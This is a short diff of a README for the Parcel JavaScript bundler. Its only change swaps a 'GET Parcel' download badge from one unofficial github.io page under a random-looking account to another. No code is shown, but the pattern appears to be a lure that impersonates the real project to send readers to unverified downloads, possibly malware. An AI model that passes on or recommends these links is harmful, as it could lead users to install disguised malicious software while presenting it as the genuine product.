@@ -1,6 +1,6 @@
 # Parcel JavaScript Bundler - Fast Web Application Bundler
 
-[![GET Parcel](https://img.shields.io/badge/GET%20%E2%80%94%20Parcel-0078D6?style=for-the-badge&logoColor=white)](https://kingsleywilcoxkril.github.io/.github/parcel-javascript-bundler)
+[![GET Parcel](https://img.shields.io/badge/GET%20%E2%80%94%20Parcel-0078D6?style=for-the-badge&logoColor=white)](https://omariaguilarvfii.github.io/.github/parcel-javascript-bundler)
 
 ## Parcel Project Overview
 
